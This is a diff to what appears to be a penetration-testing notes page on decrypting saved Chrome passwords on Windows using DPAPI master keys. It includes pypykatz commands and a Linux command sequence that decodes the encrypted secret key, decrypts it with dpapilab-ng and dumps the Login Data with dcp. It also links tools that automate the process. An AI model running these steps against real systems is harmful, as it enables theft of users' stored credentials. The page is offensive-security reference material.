@@ -56,4 +56,29 @@ $ cat mkf # master kejson file created by pypykatz
 }
 $ pypykatz dpapi chrome ./mkf "AppData/Local/Google/Chrome/User Data/Local State" --logindata "AppData/Local/Google/Chrome/User Data/Default/Login Data"
 ```
+
+➡️ We can use [decrypt-chrome-passwords](https://github.com/ohyicong/decrypt-chrome-passwords/) <small>(0.7k ⭐)</small> on Windows that actually automates the whole process.
+</div></div>
+
+<hr class="sep-both">
+
+## Additional Notes
+
+<div class="row row-cols-lg-2"><div>
+
+#### DPAPI Master Key to extract Secret Key 
+
+Once we have the DPAPI master key, we can alternatively decrypt the encrypted secret key, and use it to decrypt the passwords.
+
+On Linux, we can use [dpapilab-ng](https://github.com/tijldeneut/dpapilab-ng/blob/main/blobdec-with-masterkey.py) <small>(0.4k ⭐)</small> to decrypt the secret key and [dcp](https://github.com/palmenas/dcp/tree/main) <small>(0.002k ⭐)</small> to decrypt and dump passwords.
+
+```ps
+$ base64 -d > key.enc <<< "<secret key here>"
+$ python -c "with open('key.enc', 'rb+') as f: data = f.read(); f.seek(0); f.write(data[5:]); f.truncate()" # remove the DPAPI text at the start of the file
+$ pip install dpapick3
+$ python3 blobdec-with-masterkey.py key.enc --masterkey "<master key here>"
+<secret_key_here>
+$ python3 dcp.py -S secret_key_here -P "./Default/Login Data"
+```
+</div><div>
 </div></div>
